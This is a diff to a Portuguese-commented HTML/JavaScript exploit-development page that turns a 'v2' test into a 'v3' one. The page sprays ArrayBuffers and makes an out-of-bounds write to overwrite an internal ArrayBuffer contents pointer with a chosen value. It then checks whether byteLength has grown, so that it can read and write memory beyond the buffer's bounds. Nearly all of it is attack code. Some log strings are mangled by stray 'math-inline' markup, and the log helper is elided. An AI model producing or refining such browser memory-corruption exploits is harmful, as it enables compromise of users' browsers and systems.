@@ -2,215 +2,143 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Foco v2: Corrupção de Ponteiro Interno ArrayBuffer ([rsi+10h])</title>
-    <style> /* ... (mesmos estilos de log dos scripts anteriores) ... */
-        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
-        #output { background: #222; border: 1px solid #444; padding: 10px; height: 80vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
-        .log-info { color: #6cf; } .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; }
-        .log-vuln { color: #ff4444; font-weight: bold; } .log-good { color: #4CAF50; } .log-warn { color: #FFC107; } .log-error { color: #f44336; }
-        .log-critical { color: #f0f; font-weight: bold; } .log-leak { color: #FF9800; font-weight: bold; } .log-ptr { color: #f0f; font-weight: bold; }
-        .log-escalation { background-color: #800000; color: #fff; font-weight: bold; padding: 1px 3px; border-radius: 3px; }
-    </style>
+    <title>Foco v3: Corrupção Ponteiro com Leak e Checagem byteLength</title>
+    <style> /* ... estilos ... */ </style>
 </head>
 <body>
-    <h1>Foco v2: Corrupção de Ponteiro Interno de ArrayBuffer (Alvo: [obj_ptr+10h])</h1>
-    <p>Baseado em JSObjectGetArrayBufferByteLength ([obj_ptr+10h] -> ponteiro para contents; [contents_ptr+10h] -> byteLength).
-       Tentaremos sobrescrever o ponteiro em [obj_ptr+10h]. Um crash ou mudança no byteLength indica sucesso.</p>
-    <label for="pointerValueSelector">Valor do Ponteiro Falso a ser escrito:</label>
-    <select id="pointerValueSelector">
-        <option value="AABB">0x41414141_42424242 (Crash Test)</option>
-        <option value="AAAA">0xAAAAAAAA_AAAAAAAA (Leak Test)</option>
-    </select>
-    <br><br>
-    <button id="runBtn" onclick="runPointerCorruptionTest()">Iniciar Teste de Corrupção de Ponteiro v2</button>
+    <h1>Foco v3: Corrupção de Ponteiro Interno AB com Padrão Conhecido</h1>
+    <p>Tenta sobrescrever [obj_ptr+10h] com 0xAAAAAAAA_AAAAAAAA.
+       Verifica se targetBuffer.byteLength muda para um valor grande.</p>
+    <button id="runBtn" onclick="runPointerCorruptionTest_v3()">Iniciar Teste v3</button>
     <div id="output"></div>
 
     <script>
-        const outputDiv = document.getElementById('output');
-        const runBtn = document.getElementById('runBtn');
-        const pointerValueSelector = document.getElementById('pointerValueSelector');
-        const SHORT_PAUSE = 50;
-
-        const log = (message, type = 'info', funcName = '') => { /* ... implementação do log (copiar do script anterior)... */
-            if (!outputDiv) { console.log(`[${type.toUpperCase()}] ${funcName ? `[${funcName}] ` : ''}${message}`); return; }
-            try {
-                const timestamp = `[${new Date().toLocaleTimeString([], { hour12: false })}]`;
-                const prefix = funcName ? `[${funcName}] ` : '';
-                const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
-                const logClass = ['info', 'test', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation'].includes(type) ? type : 'info';
-                if (outputDiv.innerHTML.length > 900000) { outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 450000); outputDiv.innerHTML = `<span>[Log Truncado...]</span>\n` + outputDiv.innerHTML; }
-                outputDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`;
-                outputDiv.scrollTop = outputDiv.scrollHeight;
-            } catch (e) { console.error("Erro ao logar:", e); if (outputDiv) outputDiv.innerHTML += `[${new Date().toLocaleTimeString([], { hour12: false })}] [LOGGING ERROR] ${String(e)}\n`; }
-        };
-        const PAUSE = (ms = SHORT_PAUSE) => new Promise(resolve => setTimeout(resolve, ms));
-        const toHex = (val, bits = 32) => { /* ... implementação do toHex (copiar do script anterior)... */
-            if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid';
-            let num = Number(val);
-            if (bits <= 32) { num = num >>> 0; }
-            const pad = Math.ceil(bits / 4);
-            return '0x' + num.toString(16).toUpperCase().padStart(pad, '0');
-        };
+        // ... (log, PAUSE, toHex, toHex64 - copiar do script v2) ...
+        const log = (message, type = 'info', funcName = '') => { /* ... */ };
+        const PAUSE = (ms = 50) => new Promise(resolve => setTimeout(resolve, ms));
+        const toHex = (val, bits = 32) => { /* ... */ return '0x' + (Number(val) >>> 0).toString(16).toUpperCase().padStart(Math.ceil(bits/4), '0'); };
         const toHex64 = (high, low) => `0x${high.toString(16).toUpperCase().padStart(8, '0')}${low.toString(16).toUpperCase().padStart(8, '0')}`;
 
+        // Suposição baseada nos seus logs do Teste 2 (OOB Read Pointer Leak)
+        const LEAKED_POINTER_HIGH = 0xAAAAAAAA;
+        const LEAKED_POINTER_LOW  = 0xAAAAAAAA;
 
-        const attemptPointerCorruption = async () => {
-            const FNAME = 'attemptPointerCorruption_v2';
-            log("--- Iniciando Teste v2: Corrupção de Ponteiro Interno de ArrayBuffer ([obj_ptr+10h]) ---", 'test', FNAME);
+        // O offset que causou o crash no teste anterior
+        const CRITICAL_TOTAL_OFFSET = 32;
 
-            const controlBufferSize = 64; // Tamanho útil do buffer de controle
-            let corruptedPointerHigh, corruptedPointerLow;
+        const attemptPointerCorruption_v3 = async () => {
+            const FNAME = 'attemptPointerCorruption_v3';
+            log(`--- Iniciando Teste v3: Corrupção [obj_ptr+10h] com ${toHex64(LEAKED_POINTER_HIGH, LEAKED_POINTER_LOW)} ---`, 'test', FNAME);
 
-            const selectedPointerValue = pointerValueSelector.value;
-            if (selectedPointerValue === "AAAA") {
-                corruptedPointerHigh = 0xAAAAAAAA;
-                corruptedPointerLow  = 0xAAAAAAAA;
-                log("Usando ponteiro falso: 0xAAAAAAAA_AAAAAAAA", "info", FNAME);
-            } else { // AABB ou default
-                corruptedPointerHigh = 0x41414141;
-                corruptedPointerLow  = 0x42424242;
-                log("Usando ponteiro falso: 0x41414141_42424242", "info", FNAME);
-            }
-
-
+            const controlBufferSize = 64;
             const targetBufferOriginalSize = 64;
-            const numTargetBuffers = 250; // Aumentado um pouco o spray
+            const numTargetBuffers = 20; // Reduzido para focar no primeiro e observar melhor
             const targetBuffers = [];
-            // let originalByteLengths = []; // Não estritamente necessário se o crash é o principal indicador
 
-            // O allocationSizeControl precisa ser suficiente para o controlBufferSize útil + o maior offsetTotal testado + 8 (para a escrita U64)
-            // Maior offset testado será ~80. Então 64 + 80 + 8 = 152. Arredondar para cima.
-            const allocationSizeControl = 256;
+            const allocationSizeControl = controlBufferSize + CRITICAL_TOTAL_OFFSET + 8 + 64; // Garante espaço
             let controlBuffer, controlDv;
             try {
                 controlBuffer = new ArrayBuffer(allocationSizeControl);
                 controlDv = new DataView(controlBuffer);
-                // Preencher apenas a parte OOB com um padrão diferente para facilitar a depuração (se possível)
-                for (let i = 0; i < controlBufferSize; i++) controlDv.setUint8(i, 0xBB); // Parte útil
-                for (let i = controlBufferSize; i < controlBuffer.byteLength; i++) controlDv.setUint8(i, 0xCC); // Parte OOB
-                log(`Buffer de controle (${allocationSizeControl} bytes) alocado. Útil: ${controlBufferSize} bytes.`, 'info', FNAME);
+                for (let i = 0; i < controlBufferSize; i++) controlDv.setUint8(i, 0xBB);
+                for (let i = controlBufferSize; i < controlBuffer.byteLength; i++) controlDv.setUint8(i, 0xCC);
+                log(`Buffer de controle (${allocationSizeControl} bytes) alocado.`, 'info', FNAME);
             } catch (e) {
                 log(`Erro ao alocar buffer de controle: ${e.message}`, 'error', FNAME);
                 return;
             }
 
-            log(`Alocando ${numTargetBuffers} buffers alvo de ${targetBufferOriginalSize} bytes...`, 'info', FNAME);
+            log(`Alocando ${numTargetBuffers} buffers alvo...`, 'info', FNAME);
             for (let i = 0; i < numTargetBuffers; i++) {
                 try {
-                    const ab = new ArrayBuffer(targetBufferOriginalSize);
-                    targetBuffers.push(ab);
-                } catch (e) {
-                    log(`Erro ao alocar buffer alvo ${i}: ${e.message}`, 'warn', FNAME);
-                    // Se falhar em alocar muitos, pode indicar falta de memória, afetando o layout da heap
-                }
+                    targetBuffers.push(new ArrayBuffer(targetBufferOriginalSize));
+                } catch (e) { log(`Erro ao alocar buffer alvo ${i}: ${e.message}`, 'warn', FNAME); }
             }
             log(`${targetBuffers.length} buffers alvo alocados.`, 'info', FNAME);
             await PAUSE(100);
 
-            // totalOffset = GapEntreBuffers + TamanhoHeaderAlocadorDoTarget + 0x10h (offset interno para o ponteiro do 'contents')
-            // Hipóteses para TamanhoHeaderAlocador: 8, 16, 24, 32 bytes.
-            // Hipóteses para GapEntreBuffers: 0, 8, 16 bytes.
-            // 0x10h = 16 bytes.
-            const totalOffsetsToTry = [
-                // Gap 0:
-                0 + 8  + 16, // 24
-                0 + 16 + 16, // 32
-                0 + 24 + 16, // 40
-                0 + 32 + 16, // 48
-                // Gap 8:
-                8 + 8  + 16, // 32 (duplicado, mas ok)
-                8 + 16 + 16, // 40 (duplicado)
-                8 + 24 + 16, // 48 (duplicado)
-                8 + 32 + 16, // 56
-                // Gap 16:
-                16 + 8  + 16, // 40 (duplicado)
-                16 + 16 + 16, // 48 (duplicado)
-                16 + 24 + 16, // 56 (duplicado)
-                16 + 32 + 16, // 64
-                // Adicionar alguns valores em torno e intermediários, e menores
-                12, 16, 20, // Inclui o 16 (0+0+16, se não houver header nem gap)
-                28, 36, 44, 52, 60, 68, 72, 80
-            ];
-            const uniqueSortedOffsets = [...new Set(totalOffsetsToTry)].sort((a, b) => a - b);
-            log(`Testando ${uniqueSortedOffsets.length} offsets únicos: ${uniqueSortedOffsets.join(', ')}`, 'info', FNAME);
+            let corruptionSuccess = false;
+            let successInfo = "";
 
+            const oobWriteAddress = controlBufferSize + CRITICAL_TOTAL_OFFSET;
+            log(`Tentando escrita OOB U64 (valor <span class="math-inline">\{toHex64\(LEAKED\_POINTER\_HIGH, LEAKED\_POINTER\_LOW\)\}\) em ctrlDataEnd\+</span>{CRITICAL_TOTAL_OFFSET} (abs ${oobWriteAddress})`, 'info', FNAME);
 
-            let corruptionEvidenceFound = false;
-            let successOffsetInfo = "";
+            try {
+                controlDv.setUint32(oobWriteAddress, LEAKED_POINTER_LOW, true);
+                controlDv.setUint32(oobWriteAddress + 4, LEAKED_POINTER_HIGH, true);
+                log(`Escrita OOB U64 parece OK. Verificando targetBuffers[0].byteLength...`, 'info', FNAME);
+                await PAUSE(200);
 
-            // `baseOOBWriteOffset` é o início da área onde a escrita OOB realmente acontece,
-            // que é logo após a parte útil do `controlBuffer`.
-            const baseOOBWriteOffset = controlBufferSize;
+                const target = targetBuffers[0];
+                if (target) {
+                    const originalLength = targetBufferOriginalSize;
+                    try {
+                        const newLength = target.byteLength;
+                        log(`targetBuffers[0].byteLength ANTES da tentativa era ${originalLength}`, 'info', FNAME);
+                        log(`targetBuffers[0].byteLength AGORA é <span class="math-inline">\{toHex\(newLength\)\} \(</span>{newLength})`, newLength !== originalLength ? 'vuln' : 'info', FNAME);
 
-            main_loop:
-            for (const tryTotalOffset of uniqueSortedOffsets) {
-                if (corruptionEvidenceFound && !confirm("EVIDÊNCIA DE CORRUPÇÃO DETECTADA! Continuar testando outros offsets?")) break;
+                        if (newLength !== originalLength && newLength > originalLength + 0x1000 ) { // Heurística para tamanho "grande"
+                            log(`!!! SUCESSO POTENCIAL !!! byteLength do targetBuffers[0] mudou para um valor grande!`, 'critical', FNAME);
+                            log(`   Offset usado: ctrlDataEnd+${CRITICAL_TOTAL_OFFSET}`, 'critical', FNAME);
+                            log(`   Ponteiro escrito: ${toHex64(LEAKED_POINTER_HIGH, LEAKED_POINTER_LOW)}`, 'critical', FNAME);
+                            log(`   Novo byteLength: ${toHex(newLength)}`, 'critical', FNAME);
+                            corruptionSuccess = true;
+                            successInfo = `Buffer 0, Offset Total ${CRITICAL_TOTAL_OFFSET}, Novo Tamanho ${toHex(newLength)}`;
 
-                // O endereço de escrita é relativo ao início do `controlBuffer`.
-                const oobWriteAddress = baseOOBWriteOffset + tryTotalOffset;
-                const relOffsetForLog = `ctrlDataEnd+${tryTotalOffset}`; // Logar offset relativo ao fim da *parte útil*
-                log(`Tentando escrita OOB U64 (valor ${toHex64(corruptedPointerHigh, corruptedPointerLow)}) em ${relOffsetForLog} (abs no controlBuffer ${oobWriteAddress})`, 'info', FNAME);
+                            // TENTAR LER/ESCREVER ALÉM DO LIMITE ORIGINAL
+                            const corruptedView = new DataView(target);
+                            const readAddr = originalLength + 0x10; // Ler um pouco além do limite original
+                            const writeAddr = originalLength + 0x20;
+                            const testPattern = 0xDEADBEEF;
+                            try {
+                                log(`Tentando leitura em ${toHex(readAddr)} no buffer corrompido...`, 'info', FNAME);
+                                let val = corruptedView.getUint32(readAddr, true);
+                                log(` -> LIDO do buffer corrompido @${toHex(readAddr)}: ${toHex(val)}`, 'leak', FNAME);
 
-                if (oobWriteAddress < 0 || (oobWriteAddress + 8) > controlBuffer.byteLength) {
-                    log(`Offset ${relOffsetForLog} (abs ${oobWriteAddress}) está fora dos limites do buffer de controle alocado para U64. Pulando.`, 'warn', FNAME);
-                    continue;
-                }
-
-                try {
-                    controlDv.setUint32(oobWriteAddress, corruptedPointerLow, true);
-                    controlDv.setUint32(oobWriteAddress + 4, corruptedPointerHigh, true);
-                    log(`Escrita OOB U64 em ${relOffsetForLog} parece OK. Verificando buffers alvo...`, 'info', FNAME);
-
-                    await PAUSE(200); // Pausa um pouco maior
-
-                    for (let i = 0; i < targetBuffers.length; i++) {
-                        if (!targetBuffers[i]) continue;
-                        try {
-                            // A simples tentativa de acessar .byteLength pode causar o crash
-                            const currentLength = targetBuffers[i].byteLength;
-                            // Se não houve crash, mas o tamanho mudou, é um sinal (menos provável com ponteiro falso AABB)
-                            if (currentLength !== targetBufferOriginalSize) {
-                                log(`!!! EVIDÊNCIA: ArrayBuffer alvo ${i} byteLength ALTERADO de ${targetBufferOriginalSize} para ${currentLength}!`, 'critical', FNAME);
-                                log(`   Offset total (ctrlDataEnd+offset): ${tryTotalOffset}`, 'critical', FNAME);
-                                corruptionEvidenceFound = true;
-                                successOffsetInfo = `Buffer ${i}, Offset Total ${tryTotalOffset}, Novo Tamanho ${currentLength}`;
-                                // break main_loop; // Descomentar para parar no primeiro sinal
+                                log(`Tentando escrita de ${toHex(testPattern)} em ${toHex(writeAddr)} no buffer corrompido...`, 'info', FNAME);
+                                corruptedView.setUint32(writeAddr, testPattern, true);
+                                val = corruptedView.getUint32(writeAddr, true);
+                                if (val === testPattern) {
+                                    log(` ---> SUCESSO NA ESCRITA/LEITURA AMPLIADA! Leu ${toHex(val)} de volta.`, 'escalation', FNAME);
+                                } else {
+                                    log(` ---> FALHA na verificação da escrita ampliada. Leu ${toHex(val)} em vez de ${toHex(testPattern)}.`, 'warn', FNAME);
+                                }
+                            } catch(eRW) {
+                                log(`ERRO ao tentar R/W ampliado: ${eRW.message}`, 'error', FNAME);
                             }
-                        } catch (eAccess) {
-                            log(`!!! CRASH/ERRO AO ACESSAR byteLength do ArrayBuffer alvo ${i} !!!`, 'critical', FNAME);
-                            log(`   Offset total (ctrlDataEnd+offset): ${tryTotalOffset}`, 'critical', FNAME);
-                            log(`   Erro: ${eAccess.message}`, 'vuln', FNAME);
-                            corruptionEvidenceFound = true;
-                            successOffsetInfo = `Buffer ${i}, Offset Total ${tryTotalOffset}, CRASH/Erro ao acessar byteLength`;
-                            // break main_loop; // Descomentar para parar no primeiro sinal
-                        }
-                    }
-                    // Restaura os bytes no controlBuffer para o próximo teste de offset
-                    // Isso é crucial se não houver crash, para isolar os testes.
-                    controlDv.setUint32(oobWriteAddress, 0xCCCCCCCC, true);
-                    controlDv.setUint32(oobWriteAddress + 4, 0xCCCCCCCC, true);
 
-                } catch (eWrite) {
-                    log(`Escrita OOB U64 em ${relOffsetForLog} FALHOU/Bloqueada: ${eWrite.message}`, 'good', FNAME);
+                        } else if (newLength !== originalLength) {
+                            log(`AVISO: byteLength mudou, mas não para um valor significativamente grande. Novo: ${toHex(newLength)}`, 'warn', FNAME);
+                        }
+                    } catch (eAccess) {
+                        log(`!!! CRASH/ERRO AO ACESSAR byteLength do targetBuffers[0] após corrupção!!!`, 'critical', FNAME);
+                        log(`   Offset usado: ctrlDataEnd+${CRITICAL_TOTAL_OFFSET}`, 'critical', FNAME);
+                        log(`   Ponteiro escrito: ${toHex64(LEAKED_POINTER_HIGH, LEAKED_POINTER_LOW)}`, 'critical', FNAME);
+                        log(`   Erro: ${eAccess.message}`, 'vuln', FNAME);
+                        corruptionSuccess = true; // O crash ainda é uma evidência
+                        successInfo = `Buffer 0, Offset Total ${CRITICAL_TOTAL_OFFSET}, CRASH ao acessar byteLength`;
+                    }
+                } else {
+                    log("targetBuffers[0] não está disponível.", "warn", FNAME);
                 }
-                if (corruptionEvidenceFound && !confirm("EVIDÊNCIA DE CORRUPÇÃO DETECTADA! Continuar testando outros offsets?")) break; // Pergunta novamente após verificar todos os targets para um dado offset
-                await PAUSE(50);
+            } catch (eWrite) {
+                log(`Escrita OOB U64 FALHOU/Bloqueada: ${eWrite.message}`, 'error', FNAME);
             }
 
-            if (corruptionEvidenceFound) {
-                log(`--- EVIDÊNCIA DE CORRUPÇÃO DE PONTEIRO ENCONTRADA: ${successOffsetInfo} ---`, 'test', FNAME);
-                alert(`EVIDÊNCIA DE CORRUPÇÃO ENCONTRADA!\nDetalhes: ${successOffsetInfo}\nVerifique o console para mais logs.\nO navegador pode estar instável.`);
+            if (corruptionSuccess) {
+                log(`--- EVIDÊNCIA DE CORRUPÇÃO DE PONTEIRO ENCONTRADA: ${successInfo} ---`, 'test', FNAME);
+                alert(`EVIDÊNCIA DE CORRUPÇÃO ENCONTRADA!\n${successInfo}\nVerifique logs.`);
             } else {
-                log("--- Nenhuma evidência de corrupção de ponteiro (crash ou alteração de byteLength) detectada com os offsets testados. ---", 'test', FNAME);
+                log("--- Nenhuma evidência de corrupção (crash ou alteração significativa de byteLength) detectada. ---", 'test', FNAME);
             }
         };
 
-        const runPointerCorruptionTest = async () => {
+        const runPointerCorruptionTest_v3 = async () => {
             if (runBtn) runBtn.disabled = true;
             outputDiv.innerHTML = '';
-            log("==== INICIANDO TESTE v2 DE CORRUPÇÃO DE PONTEIRO INTERNO [obj_ptr+10h] ====", 'test', 'Main');
-            await attemptPointerCorruption();
-            log("\n==== TESTE v2 DE CORRUPÇÃO DE PONTEIRO CONCLUÍDO ====", 'test', 'Main');
+            log("==== INICIANDO TESTE v3 DE CORRUPÇÃO DE PONTEIRO INTERNO ====", 'test', 'Main');
+            await attemptPointerCorruption_v3();
+            log("\n==== TESTE v3 DE CORRUPÇÃO DE PONTEIRO CONCLUÍDO ====", 'test', 'Main');
             if (runBtn) runBtn.disabled = false;
         };
     </script>
